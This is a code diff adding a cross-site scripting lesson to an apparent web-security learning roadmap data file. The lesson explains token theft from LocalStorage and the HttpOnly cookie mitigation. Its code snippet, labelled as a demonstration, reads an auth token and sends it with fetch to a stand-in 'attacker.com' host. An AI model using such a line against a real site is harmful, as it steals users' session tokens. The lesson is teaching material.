@@ -362,6 +362,17 @@ export const roadmapNodes: RoadmapNode[] = [
         ],
         codeSnippet: `// Securing a production session cookie in headers\nSet-Cookie: session_id=s82ks91; Secure; HttpOnly; SameSite=Strict; Max-Age=3600;`,
         proTip: "Always set HttpOnly and Secure on all auth tokens. Combining them with SameSite=Lax blocks almost all standard automated security attacks."
+      },
+      {
+        title: "7. Security Threats: Cross-Site Scripting (XSS)",
+        description: "Learn how client storage vulnerabilities put user tokens at risk of data theft.",
+        points: [
+          "XSS Mechanics: Attackers inject malicious scripts into trusted websites (e.g. via input boxes or comments).",
+          "Storage Theft: If user tokens are stored in LocalStorage, an injected script can access them via 'localStorage.getItem()' and transmit them to an external server.",
+          "XSS Mitigation: Keep authentication tokens out of LocalStorage. Save tokens in an HttpOnly cookie. The browser will protect the cookie from JavaScript access."
+        ],
+        codeSnippet: `// Exploit Demonstration of a LocalStorage Token Theft\n// If token is stored in local storage, script can steal it:\nconst stolen = localStorage.getItem("auth_token");\nfetch(\`https://attacker.com/steal?token=\${stolen}\`); // Token compromised!\n\n// If stored in HttpOnly cookie:\nconsole.log(document.cookie); // Returns empty string! Attacker is blocked.`,
+        proTip: "Setting HttpOnly doesn't prevent XSS entirely, but it stops the attacker from copying the session token. They can still execute actions using standard fetch calls, but they cannot impersonate the user from other devices."
       }
     ]
   },
